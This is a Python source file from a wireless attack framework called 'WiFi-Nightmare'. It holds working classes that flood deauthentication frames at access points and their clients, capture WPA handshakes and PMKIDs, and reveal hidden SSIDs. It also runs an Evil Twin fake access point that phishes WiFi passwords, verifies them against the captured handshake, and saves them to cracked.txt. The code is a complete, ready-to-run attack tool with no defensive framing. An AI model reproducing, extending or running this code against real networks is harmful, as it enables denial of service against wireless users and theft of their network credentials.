# attacks.py
"""
WiFi-Nightmare Attack Framework
Unified module for network attacks with shared deauth logic
"""

import time
import sys
import threading
import os
import subprocess
import tempfile
from scapy.all import *
from config import C_GREEN, C_RED, C_YELLOW, C_RESET, C_CYAN, C_WHITE, HANDSHAKES_DIR
from utils import get_vendor, get_current_time_12h, run_command, verify_password
from logger import logger


class BaseAttacker:
    """Base class with shared deauth functionality"""
    
    def __init__(self, interface, target_bssid, target_channel):
        self.interface = interface
        self.target_bssid = target_bssid.lower()
        self.target_channel = target_channel
        self.clients = set()
        self.stop_deauth = False
        self.deauth_sent = 0
    
    def _get_interface_mac(self):
        """Get MAC address of the interface"""
        try:
            return get_if_hwaddr(self.interface)
        except:
            return "00:11:22:33:44:55"
    
    def _send_deauth_broadcast(self, count=5):
        """Send broadcast deauth packets"""
        try:
            pkt_bcast = RadioTap()/Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=self.target_bssid,
                addr3=self.target_bssid
            )/Dot11Deauth(reason=7)
            
            sendp(pkt_bcast, iface=self.interface, count=count, verbose=False)
            self.deauth_sent += count
            return True
        except Exception as e:
            logger.debug(f"Broadcast deauth failed: {e}")
            return False
    
    def _send_deauth_to_client(self, client_mac, count=3):
        """Send targeted deauth packets to a specific client"""
        try:
            if client_mac.startswith(("33:33", "ff:ff", "01:00")):
                return False
            
            pkt_client = RadioTap()/Dot11(
                addr1=client_mac,
                addr2=self.target_bssid,
                addr3=self.target_bssid
            )/Dot11Deauth(reason=7)
            
            sendp(pkt_client, iface=self.interface, count=count, verbose=False)
            self.deauth_sent += count
            return True
        except Exception as e:
            logger.debug(f"Client deauth failed for {client_mac}: {e}")
            return False
    
    def _deauth_loop_aggressive(self):
        """Aggressive deauth loop for maximum effectiveness"""
        try:
            while not self.stop_deauth:
                try:
                    # Send broadcast deauth
                    self._send_deauth_broadcast(count=5)
                    
                    # Send targeted deauth to each client
                    current_clients = list(self.clients)
                    for client_info in current_clients:
                        # Handle both tuple (mac, vendor) and plain mac string
                        client_mac = client_info[0] if isinstance(client_info, tuple) else client_info
                        self._send_deauth_to_client(client_mac, count=3)
                    
                    # Short delay for aggressive attack
                    time.sleep(0.5)
                    
                except Exception as e:
                    logger.debug(f"Deauth loop error: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            logger.error(f"Deauth loop crashed: {e}")


class NetworkAttacker(BaseAttacker):
    """Handshake capture and network attacks"""
    
    def __init__(self, interface, target_bssid, target_channel, db_handler, attack_mode="reveal", target_ssid="Unknown"):
        super().__init__(interface, target_bssid, target_channel)
        self.db = db_handler
        self.target_ssid = target_ssid
        self.attack_mode = attack_mode
        
        self.stop_attack = False
        self.success = False
        self.result_data = None
        
        self.handshake_captured = False
        self.pmkid_captured = False
        self.handshake_filename = ""
        self.eapol_packets = []
        self.best_beacon = None
        self.ssid_packets = []  # Store probe responses/assoc frames with SSID
        
        # Additional context packets for hcxpcapngtool compatibility
        self.auth_packets = []  # Authentication frames
        self.assoc_packets = []  # Association/Reassociation frames
        self.probe_req_packets = []  # Probe request frames
        
        self.threads = []
        self.deauth_event = threading.Event()

    def start_deauth_thread(self):
        if self.attack_mode == "passive":
            return
        
        self.deauth_event.clear()
        
        if self.attack_mode == "pmkid":
            t = threading.Thread(target=self._pmkid_attack_loop, daemon=True)
        elif self.attack_mode == "deauth_only":
            t = threading.Thread(target=self._deauth_loop_aggressive, daemon=True)
        else:
            t = threading.Thread(target=self._attack_loop, daemon=True)
        
        t.start()
        self.threads.append(t)

    def join_threads(self):
        """Wait for all threads to complete"""
        self.stop_attack = True
        self.stop_deauth = True
        self.deauth_event.set()
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1.0)
                
    def _pmkid_attack_loop(self):
        try:
            my_mac = self._get_interface_mac()
            pkt_auth = RadioTap()/Dot11(addr1=self.target_bssid, addr2=my_mac, addr3=self.target_bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
            pkt_assoc = RadioTap()/Dot11(addr1=self.target_bssid, addr2=my_mac, addr3=self.target_bssid)/Dot11AssoReq(cap=0x1100, listen_interval=0x00a) / Dot11Elt(ID=0, info=self.target_ssid)
    
            while not self.stop_attack and not self.pmkid_captured:
                try:
                    sendp(pkt_auth, iface=self.interface, verbose=False, count=1)
                    time.sleep(0.1)
                    if self.target_ssid != "Unknown":
                        sendp(pkt_assoc, iface=self.interface, verbose=False, count=1)
                except OSError as e:
                     logger.debug(f"TX failed (PMKID): {e}")
                except Exception as e:
                     logger.debug(f"PMKID Attack Loop Error: {e}")
                time.sleep(2)
        except Exception as e:
            logger.error(f"PMKID Thread Crash: {e}")

    def _attack_loop(self):
        try:
            pkt_probe = RadioTap()/Dot11(addr1=self.target_bssid, addr2=self._get_interface_mac(), addr3=self.target_bssid)/Dot11ProbeReq()/Dot11Elt(ID="SSID", info="")

            while not self.stop_attack:
                if self.success and self.attack_mode == "reveal": break
                if self.handshake_captured and self.attack_mode == "handshake": break

                try:
                    if self.clients:
                        # Convert to list to avoid runtime modification issues
                        current_clients = list(self.clients)
                        for client_mac, _ in current_clients:
                            self._send_deauth_to_client(client_mac, count=3)
                            time.sleep(0.05)
                    else:
                        self._send_deauth_broadcast(count=2)
                    
                    # Skip probe requests for deauth_only mode
                    if self.attack_mode not in ["handshake", "deauth_only"]:
                        sendp(pkt_probe, iface=self.interface, count=1, verbose=False)
                except OSError as e:
                    logger.debug(f"TX failed: {e}")
                except Exception as e:
                    logger.debug(f"Attack Loop Error: {e}")
                
                time.sleep(4)
        except Exception as e:
            logger.error(f"Attack Thread Crash: {e}")

    def interface_mac(self):
        return self._get_interface_mac()

    def sniffer_callback(self, pkt):
        if self.stop_attack and self.attack_mode == "deauth_only": return
        if self.success and self.attack_mode == "reveal": return
        if self.pmkid_captured and self.attack_mode == "pmkid": return
        
        # Extended capture mode: After getting 4 EAPOL packets, continue for 10 seconds
        # to collect authentication/association frames for hcxpcapngtool
        if hasattr(self, 'extended_capture_start'):
            elapsed = time.time() - self.extended_capture_start
            if elapsed > 10 and not self.handshake_captured:
                # Time to save the handshake with all context frames
                self.save_handshake()
                return
        
        if self.handshake_captured and self.attack_mode == "handshake":
             # If we captured handshake but don't have SSID yet, keep sniffing!
             if self.target_ssid != "Unknown" and self.target_ssid != "<HIDDEN>":
                 return


        try:
            if pkt.haslayer(Dot11):
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                addr3 = pkt.addr3.lower() if pkt.addr3 else ""
                
                # Capture beacon frames for the target AP
                if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                    if addr2 == self.target_bssid or addr3 == self.target_bssid:
                        # Store the best (strongest) beacon
                        if not self.best_beacon:
                            self.best_beacon = pkt
                            logger.debug(f"Captured beacon from {self.target_bssid}")
                        elif pkt.haslayer(RadioTap):
                            # Update if this beacon has better signal
                            new_rssi = pkt[RadioTap].dBm_AntSignal if hasattr(pkt[RadioTap], 'dBm_AntSignal') else -100
                            old_rssi = self.best_beacon[RadioTap].dBm_AntSignal if self.best_beacon.haslayer(RadioTap) and hasattr(self.best_beacon[RadioTap], 'dBm_AntSignal') else -100
                            if new_rssi > old_rssi:
                                self.best_beacon = pkt
                
                # Capture Authentication frames (subtype 11)
                # Critical for hcxpcapngtool
                if pkt.type == 0 and pkt.subtype == 11:
                    if self.target_bssid in [addr1, addr2, addr3]:
                        if pkt not in self.auth_packets:
                            self.auth_packets.append(pkt)
                            logger.debug(f"Captured authentication frame {len(self.auth_packets)}")
                
                # Capture Association/Reassociation frames (subtypes 0, 1, 2, 3)
                # Critical for hcxpcapngtool
                if pkt.type == 0 and pkt.subtype in [0, 1, 2, 3]:
                    if self.target_bssid in [addr1, addr2, addr3]:
                        if pkt not in self.assoc_packets:
                            self.assoc_packets.append(pkt)
                            logger.debug(f"Captured association frame (subtype {pkt.subtype})")
                
                # Capture Probe Request frames (subtype 4)
                # Undirected probe requests are valuable for hcxpcapngtool
                if pkt.type == 0 and pkt.subtype == 4:
                    # Capture both directed (to our BSSID) and undirected (broadcast)
                    if addr1 == "ff:ff:ff:ff:ff:ff" or self.target_bssid in [addr1, addr3]:
                        if pkt not in self.probe_req_packets:
                            self.probe_req_packets.append(pkt)
                            logger.debug(f"Captured probe request frame")
                
                client_mac = None
                if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                    client_mac = addr2
                elif self.target_bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                    client_mac = addr1
                
                if client_mac:
                    known = False
                    for c, v in self.clients:
                        if c == client_mac: known = True
                    if not known:
                        vendor = get_vendor(client_mac)
                        self.clients.add((client_mac, vendor))
                
                if self.attack_mode == "deauth_only": return
    
            # Capture EAPOL packets (4-way handshake)
            if pkt.haslayer(EAPOL):
                if self.target_bssid in [addr1, addr2]:
                    # Validate EAPOL packet has necessary data
                    if pkt.haslayer(Raw) or len(bytes(pkt)) > 100:  # EAPOL packets should have substantial data
                        # Check if this is a new EAPOL packet (not duplicate)
                        is_duplicate = False
                        for existing_pkt in self.eapol_packets:
                            # Simple duplicate check based on packet content
                            if bytes(pkt) == bytes(existing_pkt):
                                is_duplicate = True
                                break
                        
                        if not is_duplicate:
                            self.eapol_packets.append(pkt)
                            logger.debug(f"Captured EAPOL packet {len(self.eapol_packets)}/4 from {addr1} <-> {addr2}")
                            
                            # When we have 4 EAPOL packets, start extended capture timer
                            # DON'T save immediately - continue capturing for context frames
                            if len(self.eapol_packets) >= 4 and not self.handshake_captured:
                                if not hasattr(self, 'extended_capture_start'):
                                    self.extended_capture_start = time.time()
                                    logger.info("Got 4 EAPOL packets, continuing capture for context frames...")
                                    print(f"\n{C_GREEN}[+] 4-way handshake captured! Collecting context frames...{C_RESET}")

    
            if self.target_ssid == "Unknown" or self.target_ssid == "<HIDDEN>" or self.attack_mode == "reveal":
                if pkt.type == 0 and pkt.subtype in [0, 2, 4, 5, 8]:
                    if self.target_bssid in [addr1, addr2, addr3]:
                            if pkt.haslayer(Dot11Elt):
                                try:
                                    elt = pkt.getlayer(Dot11Elt)
                                    while elt:
                                        if elt.ID == 0:
                                            ssid = elt.info.decode('utf-8', errors='ignore')
                                            if ssid and not ssid.startswith("\x00") and len(ssid) > 0:
                                                # Store this packet - it contains the SSID!
                                                # Critical for hidden networks
                                                if pkt not in self.ssid_packets:
                                                    self.ssid_packets.append(pkt)
                                                    logger.debug(f"Captured SSID-containing packet: {ssid} (subtype {pkt.subtype})")
                                                
                                                self.target_ssid = ssid
                                                self.db.save(self.target_bssid, ssid)
    
                                                self.result_data = {
                                                    "SSID": ssid,
                                                    "BSSID": self.target_bssid,
                                                    "Channel": self.target_channel,
                                                    "Clients": len(self.clients)
                                                }
                                                
                                                if self.attack_mode == "reveal" or self.attack_mode == "passive":
                                                    self.success = True
                                                    self.stop_attack = True
                                                
                                                # DON'T call save_handshake here!
                                                # Let the extended capture timer handle it
                                                # if self.handshake_captured: self.save_handshake()
                                                return
                                        elt = elt.payload
                                except Exception as e:
                                    logger.debug(f"ELT parsing error: {e}")
        except Exception:
             pass

    def save_handshake(self, suffix=""):
        """Save captured handshake to PCAP file with validation"""
        # 1. Prepare filename
        safe_ssid = "".join([c for c in self.target_ssid if c.isalpha() or c.isdigit() or c==' ']).strip()
        if not safe_ssid or safe_ssid == "<HIDDEN>": safe_ssid = "Unknown_SSID"
        filename = f"{self.target_bssid.replace(':','-')}_{safe_ssid}{suffix}.pcap"
        full_path = os.path.join(HANDSHAKES_DIR, filename)
        
        # 2. Validate we have necessary packets
        if not self.eapol_packets:
            logger.warning("No EAPOL packets captured, cannot save handshake")
            return
        
        if len(self.eapol_packets) < 2:
            logger.warning(f"Only {len(self.eapol_packets)} EAPOL packet(s) captured, need at least 2")
            return
        
        # 3. Build packet list with proper ordering for hcxpcapngtool
        packets_to_save = []
        
        # Add beacon first (critical for aircrack-ng)
        if self.best_beacon:
            packets_to_save.append(self.best_beacon)
            logger.debug("Added beacon to handshake file")
        else:
            logger.warning("No beacon packet captured - handshake may not verify properly")
        
        # Add probe request frames (undirected probes are valuable for hcxpcapngtool)
        if self.probe_req_packets:
            packets_to_save.extend(self.probe_req_packets)
            logger.debug(f"Added {len(self.probe_req_packets)} probe request frames")
        
        # Add SSID-containing packets (probe responses, association frames)
        # CRITICAL for hidden networks - aircrack needs to see the SSID
        if self.ssid_packets:
            packets_to_save.extend(self.ssid_packets)
            logger.debug(f"Added {len(self.ssid_packets)} SSID-containing packets (for hidden network)")
        
        # Add authentication frames (critical for hcxpcapngtool)
        if self.auth_packets:
            packets_to_save.extend(self.auth_packets)
            logger.debug(f"Added {len(self.auth_packets)} authentication frames")
        
        # Add association/reassociation frames (critical for hcxpcapngtool)
        if self.assoc_packets:
            packets_to_save.extend(self.assoc_packets)
            logger.debug(f"Added {len(self.assoc_packets)} association frames")
        
        # Add all EAPOL packets (4-way handshake)
        packets_to_save.extend(self.eapol_packets)
        logger.debug(f"Added {len(self.eapol_packets)} EAPOL packets to handshake file")
        
        if len(packets_to_save) < 2:
            logger.error("Insufficient packets for valid handshake")
            return
        
        try:
            # Save to PCAP file
            wrpcap(full_path, packets_to_save)
            logger.info(f"Saved {len(packets_to_save)} packets to {full_path}")
            
            # 4. Verify with aircrack-ng
            print(f"\n{C_YELLOW}[*] Verifying handshake quality...{C_RESET}")
            
            # Show detailed packet statistics
            print(f"{C_CYAN}    Total packets: {len(packets_to_save)}{C_RESET}")
            print(f"{C_CYAN}    ├─ Beacon: {'Yes' if self.best_beacon else 'No'}{C_RESET}")
            if self.probe_req_packets:
                print(f"{C_CYAN}    ├─ Probe Requests: {len(self.probe_req_packets)}{C_RESET}")
            if self.ssid_packets:
                print(f"{C_CYAN}    ├─ SSID frames: {len(self.ssid_packets)}{C_RESET}")
            if self.auth_packets:
                print(f"{C_CYAN}    ├─ Authentication: {len(self.auth_packets)}{C_RESET}")
            if self.assoc_packets:
                print(f"{C_CYAN}    ├─ Association: {len(self.assoc_packets)}{C_RESET}")
            print(f"{C_CYAN}    └─ EAPOL: {len(self.eapol_packets)}{C_RESET}")
            
            # Highlight hcxpcapngtool compatibility
            if self.auth_packets and self.assoc_packets:
                print(f"{C_GREEN}    ✓ Auth/Assoc frames present (hcxpcapngtool compatible){C_RESET}")
            else:
                print(f"{C_YELLOW}    ⚠ Missing Auth/Assoc frames (may affect hcxpcapngtool){C_RESET}")
            
            cmd = ["aircrack-ng", full_path]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            # Check for valid handshake
            if "1 handshake" in proc.stdout or "handshake" in proc.stdout.lower():
                self.handshake_captured = True
                self.handshake_filename = full_path
                self.success = True
                
                # Update DB
                if self.db:
                     self.db.update_handshake(self.target_bssid, True, get_current_time_12h(), full_path)
                
                if self.attack_mode == "handshake":
                    self.stop_attack = True
                    
                print(f"{C_GREEN}[+] VALID HANDSHAKE CONFIRMED!{C_RESET}")
                print(f"{C_GREEN}    File: {full_path}{C_RESET}")
                logger.info(f"Valid handshake confirmed for {self.target_bssid}")
            else:
                # Handshake not valid - provide detailed feedback
                print(f"{C_RED}[-] Handshake verification failed{C_RESET}")
                
                # Analyze aircrack output for specific issues
                if "No networks found" in proc.stdout:
                    print(f"{C_YELLOW}    Issue: No networks found in capture{C_RESET}")
                    logger.warning("Aircrack found no networks - beacon may be missing or corrupted")
                elif "No matching network" in proc.stdout:
                    print(f"{C_YELLOW}    Issue: Network BSSID mismatch{C_RESET}")
                    logger.warning("BSSID mismatch in capture file")
                elif "Got no data packets" in proc.stdout or "0 handshake" in proc.stdout:
                    print(f"{C_YELLOW}    Issue: Incomplete 4-way handshake{C_RESET}")
                    print(f"{C_YELLOW}    Captured {len(self.eapol_packets)} EAPOL packets, may need all 4 messages{C_RESET}")
                    logger.warning(f"Incomplete handshake - only {len(self.eapol_packets)} EAPOL packets")
                else:
                    print(f"{C_YELLOW}    Aircrack output:{C_RESET}")
                    for line in proc.stdout.split('\n')[:5]:  # Show first 5 lines
                        if line.strip():
                            print(f"    {line}")
                
                # Keep the file for manual inspection but don't mark as captured
                logger.info(f"Saved incomplete handshake to {full_path} for manual review")
                print(f"{C_CYAN}    File saved for manual review: {full_path}{C_RESET}")
                
                # Don't delete - keep for debugging
                # Reset EAPOL packets to try again
                self.eapol_packets = []
                
        except subprocess.TimeoutExpired:
            logger.error("Aircrack-ng verification timed out")
            print(f"{C_RED}[!] Verification timed out{C_RESET}")
        except Exception as e:
            logger.error(f"Save Error: {e}")
            print(f"{C_RED}[!] Error saving handshake: {e}{C_RESET}")



class EvilTwinAttack(BaseAttacker):
    """Evil Twin attack with ESP32 integration"""
    
    def __init__(self, esp_driver, db_handler, target_bssid, target_channel, target_ssid, interface=None):
        super().__init__(interface, target_bssid, target_channel)
        self.esp = esp_driver
        self.db = db_handler
        self.bssid = target_bssid
        self.channel = target_channel
        self.ssid = target_ssid
        self.handshake_file = ""
        
        # Deauth attack variables
        self.deauth_threads = []
        self.deauth_processes = []
        self.correct_password = None
        self.blacklist_file = None
        self.total_deauths = 0
        
        # Performance tracking
        self.scapy_count = 0
        self.esp_count = 0

    def _create_blacklist_file(self):
        """Create blacklist file for mdk3"""
        try:
            fd, self.blacklist_file = tempfile.mkstemp(suffix='_blacklist.txt', text=True)
            with os.fdopen(fd, 'w') as f:
                f.write(self.bssid + '\n')
            return True
        except Exception as e:
            print(f"{C_RED}[!] Failed to create blacklist file: {e}{C_RESET}")
            return False

    def _cleanup_blacklist(self):
        """Remove temporary blacklist file"""
        if self.blacklist_file and os.path.exists(self.blacklist_file):
            try:
                os.remove(self.blacklist_file)
            except:
                pass

    def _setup_interface(self):
        """Prepare the interface for deauth attacks"""
        if not self.interface:
            return False
        
        try:
            print(f"{C_YELLOW}[*] Killing interfering processes...{C_RESET}")
            run_command(["airmon-ng", "check", "kill"])
            run_command(["killall", "wpa_supplicant", "NetworkManager"])
            
            run_command(["ip", "link", "set", self.interface, "down"])
            time.sleep(1)
            
            run_command(["iw", "dev", self.interface, "set", "type", "monitor"])
            time.sleep(1)
            
            run_command(["ip", "link", "set", self.interface, "up"])
            time.sleep(1)
            
            run_command(["iwconfig", self.interface, "channel", str(self.channel)])
            time.sleep(1)
            
            print(f"{C_GREEN}[+] Interface {self.interface} set to monitor mode on channel {self.channel}{C_RESET}")
            return True
            
        except Exception as e:
            print(f"{C_RED}[!] Failed to setup interface: {e}{C_RESET}")
            return False

    def _enforce_channel(self):
        """Keep interface on the correct channel"""
        while not self.stop_deauth:
            try:
                run_command(["iwconfig", self.interface, "channel", str(self.channel)])
                time.sleep(2)
            except:
                pass

    def _sniffer_thread(self):
        """Continuous sniffer to find clients"""
        while not self.stop_deauth:
            try:
                sniff(iface=self.interface, prn=self._sniff_callback, timeout=1.0, store=0)
            except Exception:
                pass

    def _sniff_callback(self, pkt):
        """Process sniffed packets to find clients"""
        if pkt.haslayer(Dot11):
            addr1 = pkt.addr1.lower() if pkt.addr1 else ""
            addr2 = pkt.addr2.lower() if pkt.addr2 else ""
            
            client_mac = None
            if self.bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                client_mac = addr2
            elif self.bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                client_mac = addr1
            
            if client_mac and client_mac not in self.clients:
                self.clients.add(client_mac)

    def _scapy_deauth(self):
        """Scapy deauth using shared base class logic"""
        try:
            print(f"{C_GREEN}[+] Starting Scapy deauth attack{C_RESET}")
            
            while not self.stop_deauth:
                try:
                    # Use shared deauth methods from BaseAttacker
                    self._send_deauth_broadcast(count=5)
                    self.scapy_count += 5
                    self.total_deauths += 5
                    
                    # Send targeted deauth to each client
                    current_clients = list(self.clients)
                    for client_mac in current_clients:
                        if self._send_deauth_to_client(client_mac, count=3):
                            self.scapy_count += 3
                            self.total_deauths += 3
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"{C_RED}[!] Scapy error: {e}{C_RESET}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"{C_RED}[!] Scapy thread crashed: {e}{C_RESET}")

    def _esp_deauth(self):
        """Use ESP device for additional deauth"""
        try:
            if not self.esp or not self.esp.is_connected:
                print(f"{C_YELLOW}[!] ESP not connected, skipping ESP deauth{C_RESET}")
                return
            
            print(f"{C_GREEN}[+] Starting ESP deauth attack{C_RESET}")
            
            while not self.stop_deauth:
                try:
                    self.esp.start_attack(self.bssid, self.channel, duration=2)
                    self.esp_count += 1
                    self.total_deauths += 50
                    time.sleep(3)
                except Exception as e:
                    print(f"{C_RED}[!] ESP deauth error: {e}{C_RESET}")
                    time.sleep(2)
        except Exception as e:
            print(f"{C_RED}[!] ESP deauth thread crashed: {e}{C_RESET}")

    def _start_deauth_attacks(self):
        """Start deauth attacks"""
        print(f"\n{C_CYAN}[*] Starting DEAUTH ATTACK (Scapy + ESP){C_RESET}")
        
        # Start channel enforcer
        chan_thread = threading.Thread(target=self._enforce_channel, daemon=True)
        chan_thread.start()
        self.deauth_threads.append(chan_thread)
        
        # Start Sniffer
        sniffer_thread = threading.Thread(target=self._sniffer_thread, daemon=True)
        sniffer_thread.start()
        self.deauth_threads.append(sniffer_thread)
        
        # Start Scapy thread
        scapy_thread = threading.Thread(target=self._scapy_deauth, daemon=True)
        scapy_thread.start()
        self.deauth_threads.append(scapy_thread)
        
        # Start ESP deauth thread
        esp_thread = threading.Thread(target=self._esp_deauth, daemon=True)
        esp_thread.start()
        self.deauth_threads.append(esp_thread)
        
        print(f"{C_GREEN}[+] Deauth threads started{C_RESET}")

    def _stop_deauth_attacks(self):
        """Stop all deauth attacks"""
        print(f"{C_YELLOW}[*] Stopping all deauth attacks...{C_RESET}")
        
        self.stop_deauth = True
        
        # Kill all subprocesses
        for process in self.deauth_processes:
            try:
                if process.poll() is None:
                    process.terminate()
                    time.sleep(0.5)
                    if process.poll() is None:
                        process.kill()
            except:
                pass
        
        # Wait for threads to finish
        for thread in self.deauth_threads:
            try:
                thread.join(timeout=2.0)
            except:
                pass
        
        # Cleanup blacklist file
        self._cleanup_blacklist()
        
        print(f"{C_GREEN}[+] All deauth attacks stopped{C_RESET}")

    def _display_status(self):
        """Display real-time attack status"""
        try:
            last_display = time.time()
            display_count = 0
            
            while not self.stop_deauth:
                current_time = time.time()
                
                if current_time - last_display > 3.0:
                    display_count += 1
                    
                    sys.stdout.write("\r\033[K")
                    
                    status_line = f"{C_CYAN}[{display_count}] {C_RESET}"
                    
                    if self.clients:
                        status_line += f"{C_YELLOW}👥 {len(self.clients)} clients{C_RESET} "
                    
                    status_line += f"{C_RED}🔥 "
                    status_line += f"S:{self.scapy_count} "
                    if self.esp_count > 0:
                        status_line += f"E:{self.esp_count} "
                    status_line += f"T:{self.total_deauths}{C_RESET}"
                    
                    status_line += f" {C_GREEN}👿 Evil Twin: '{self.ssid}'{C_RESET}"
                    
                    sys.stdout.write(status_line)
                    sys.stdout.flush()
                    
                    last_display = current_time
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{C_RED}[!] Status display error: {e}{C_RESET}")

    def run(self):
        """Main attack method"""
        # 1. Check if handshake exists
        info = self.db.get_info(self.bssid)
        if not info or not info.get('Handshake') or not info.get('HSFile'):
            print(f"{C_RED}[!] Error: No Handshake found for this network!{C_RESET}")
            return
        
        self.handshake_file = info['HSFile']
        print(f"{C_GREEN}[+] Handshake file found: {self.handshake_file}{C_RESET}")
        
        # 2. Setup interface
        if self.interface:
            if not self._setup_interface():
                print(f"{C_RED}[!] Cannot perform deauth attacks without interface{C_RESET}")
                return
        
        # 3. Start deauth attacks
        self._start_deauth_attacks()
        
        # 4. Start status display
        status_thread = threading.Thread(target=self._display_status, daemon=True)
        status_thread.start()
        
        # 5. Start Evil Twin on ESP
        print(f"\n{C_CYAN}[*] Starting Evil Twin on ESP...{C_RESET}")
        print(f"{C_YELLOW}[*] Fake AP SSID: '{self.ssid}'{C_RESET}")
        
        self.esp.start_host(self.ssid, self.channel)
        time.sleep(2)
        self.esp.start_attack(self.bssid, self.channel)
        
        print(f"\n{C_GREEN}[+] Attack is running!{C_RESET}")
        print(f"{C_YELLOW}[*] Clients are being deauthenticated from {self.bssid}{C_RESET}")
        print(f"{C_YELLOW}[*] They will connect to Evil Twin: '{self.ssid}'{C_RESET}")
        print(f"{C_YELLOW}[*] Waiting for password... (Ctrl+C to stop){C_RESET}\n")
        
        try:
            while True:
                # Check for captured password
                if self.esp.captured_password:
                    raw_pass = self.esp.captured_password.strip()
                    self.esp.captured_password = None
                    
                    print(f"\n{C_CYAN}[+] Password attempt received: '{raw_pass}'{C_RESET}")
                    
                    # Validate password length
                    if len(raw_pass) < 8:
                        print(f"{C_RED}[!] Invalid: Password too short (<8 chars){C_RESET}")
                        self.esp.send_no()
                        continue
                    
                    if len(raw_pass) > 63:
                        print(f"{C_RED}[!] Invalid: Password too long (>63 chars){C_RESET}")
                        self.esp.send_no()
                        continue
                    
                    # Verify password using unified function
                    print(f"{C_YELLOW}[*] Verifying password...{C_RESET}")
                    if verify_password(self.handshake_file, self.bssid, self.ssid, raw_pass):
                        # SUCCESS!
                        print(f"\n{C_GREEN}{'='*70}{C_RESET}")
                        print(f"{C_GREEN}[!!!] PASSWORD CRACKED SUCCESSFULLY [!!!]{C_RESET}")
                        print(f"{C_GREEN}{'='*70}{C_RESET}")
                        print(f"{C_WHITE}    Target: {self.ssid}{C_RESET}")
                        print(f"{C_WHITE}    BSSID: {self.bssid}{C_RESET}")
                        print(f"{C_WHITE}    Password: {raw_pass}{C_RESET}")
                        print(f"{C_GREEN}{'='*70}{C_RESET}")
                        
                        self.esp.send_ok()
                        self.correct_password = raw_pass
                        
                        # Save password
                        with open("cracked.txt", "a") as f:
                            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"[{timestamp}] SSID: {self.ssid} | BSSID: {self.bssid} | Password: {raw_pass}\n")
                        
                        # Stop attacks
                        self._stop_deauth_attacks()
                        self.esp.stop_all()
                        
                        # Show summary
                        print(f"\n{C_YELLOW}[*] ATTACK SUMMARY:{C_RESET}")
                        print(f"{C_WHITE}    Total clients targeted: {len(self.clients)}{C_RESET}")
                        print(f"{C_WHITE}    Deauth packets sent: {self.total_deauths}{C_RESET}")
                        print(f"{C_WHITE}    - Scapy: {self.scapy_count}{C_RESET}")
                        print(f"{C_WHITE}    - ESP: {self.esp_count}{C_RESET}")
                        print(f"{C_WHITE}    Password saved to: cracked.txt{C_RESET}")
                        print(f"{C_GREEN}[+] Attack completed successfully!{C_RESET}")
                        
                        return
                    else:
                        print(f"{C_RED}[-] Password incorrect{C_RESET}")
                        self.esp.send_no()
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print(f"\n\n{C_RED}[!] Attack stopped by user{C_RESET}")
        
        finally:
            # Cleanup
            self._stop_deauth_attacks()
            self.esp.stop_all()
            
            # Restore interface
            if self.interface:
                try:
                    run_command(["ip", "link", "set", self.interface, "down"])
                    run_command(["iw", "dev", self.interface, "set", "type", "managed"])
                    run_command(["ip", "link", "set", self.interface, "up"])
                    print(f"{C_GREEN}[+] Interface {self.interface} restored to managed mode{C_RESET}")
                except Exception as e:
                    print(f"{C_RED}[!] Failed to restore interface: {e}{C_RESET}")
            
            print(f"\n{C_YELLOW}[*] Final stats:{C_RESET}")
            print(f"{C_WHITE}    Total deauth packets: {self.total_deauths}{C_RESET}")
            print(f"{C_WHITE}    Clients discovered: {len(self.clients)}{C_RESET}")
            
            if self.correct_password:
                print(f"{C_GREEN}[+] Password found: {self.correct_password}{C_RESET}")
            else:
                print(f"{C_RED}[-] No password found{C_RESET}")
